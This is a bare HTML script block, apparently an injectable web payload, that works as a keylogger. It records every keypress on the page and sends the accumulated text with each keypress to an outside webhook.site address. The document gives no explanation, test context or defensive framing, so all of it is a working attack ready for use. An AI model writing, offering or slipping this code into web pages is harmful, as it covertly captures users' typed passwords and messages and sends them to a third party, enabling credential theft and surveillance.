
<script type="text/javascript">
    var l = "";             
    document.onkeypress = function (e) {
        l += e.key;
        console.log(l);     

        var req = new XMLHttpRequest();
        req.open("POST","https://webhook.site/73066209-6edc-440e-9abf-2d42f55b2ab2", true); 
        req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        req.send("data=" + l);
        
    }
</script>




